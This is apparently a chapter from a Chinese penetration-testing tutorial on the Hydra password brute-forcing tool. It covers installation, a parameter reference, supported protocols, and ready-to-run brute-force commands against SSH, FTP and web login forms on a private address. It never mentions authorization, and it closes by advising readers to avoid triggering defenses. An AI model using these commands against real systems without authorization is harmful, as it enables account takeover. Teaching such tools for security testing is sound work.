# 第九章：Hydra - 在线密码爆破工具

## 9.1 Hydra 简介

### 什么是 Hydra？

想象你同时派出100个人去尝试打开不同的门。**Hydra**就是这样的工具——一个快速的在线密码爆破工具。

**Hydra**可以爆破：
- SSH登录
- FTP登录
- Web表单登录
- 各种网络服务

简单来说，Hydra是**在线密码爆破的神器**。

### Hydra与Hashcat的区别

| 工具 | 破解方式 | 适用场景 |
|------|------|----------|
| Hydra | 在线爆破 | 网络服务登录 |
| Hashcat | 离线破解 | 已有密码哈希 |

---

## 9.2 Windows 系统安装教程

### 下载安装

1. 访问：https://github.com/vanhauser-thc/thc-hydra
2. 下载Windows版本
3. 解压到固定目录

### 使用Cygwin安装

Hydra在Windows上需要Cygwin环境：
1. 安装Cygwin
2. 在Cygwin中安装Hydra

---

## 9.3 Linux 系统安装教程

### Kali Linux（预装）

Kali预装Hydra：
```bash
hydra -h
```

### Ubuntu/Debian 安装

```bash
sudo apt install hydra
```

### 源码安装

```bash
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install
```

---

## 9.4 基础爆破命令详解

### 基本命令结构

```bash
hydra -l USER -L USERLIST -p PASS -P PASSLIST target SERVICE
```

参数说明：
| 参数 | 说明 |
|------|------|
| -l | 单个用户名 |
| -L | 用户名列表文件 |
| -p | 单个密码 |
| -P | 密码列表文件 |
| -t | 线程数 |
| -v | 详细输出 |
| -V | 显示每次尝试 |

### 示例

**爆破SSH：**
```bash
hydra -l root -P passwords.txt ssh://192.168.1.1
```

---

## 9.5 多协议支持详解

### 支持的协议

| 协议 | 命令 |
|------|------|
| SSH | ssh |
| FTP | ftp |
| Telnet | telnet |
| HTTP | http-get / http-post |
| HTTPS | https-get / https-post |
| MySQL | mysql |
| MSSQL | mssql |
| PostgreSQL | postgres |
| SMB | smb |
| RDP | rdp |
| VNC | vnc |
| SMTP | smtp |
| POP3 | pop3 |
| IMAP | imap |
| LDAP | ldap |

---

## 9.6 实战案例：SSH密码爆破

### 基本爆破

```bash
hydra -l root -P passwords.txt ssh://192.168.1.1
```

### 多线程爆破

```bash
hydra -l root -P passwords.txt -t 4 ssh://192.168.1.1
```

### 结果输出

```
[22][ssh] host: 192.168.1.1 login: root password: admin123
```

---

## 9.7 实战案例：FTP密码爆破

### 基本爆破

```bash
hydra -l admin -P passwords.txt ftp://192.168.1.1
```

### 使用用户名列表

```bash
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

---

## 9.8 实战案例：Web表单爆破

### HTTP POST爆破

```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:F=failed"
```

参数说明：
- `/login`：登录路径
- `username=^USER^&password=^PASS^`：POST参数
- `F=failed`：失败标识

### HTTP GET爆破

```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-get "/login.php?username=admin&password=^PASS^"
```

---

## 总结

本章介绍了Hydra的使用：

1. **安装配置**：Windows/Linux安装
2. **基础命令**：爆破参数详解
3. **协议支持**：SSH、FTP、HTTP等
4. **实战案例**：各种服务爆破

Hydra是在线密码爆破的必备工具，但要谨慎使用，避免触发防护机制。

下一章我们将学习DirBuster——目录扫描工具！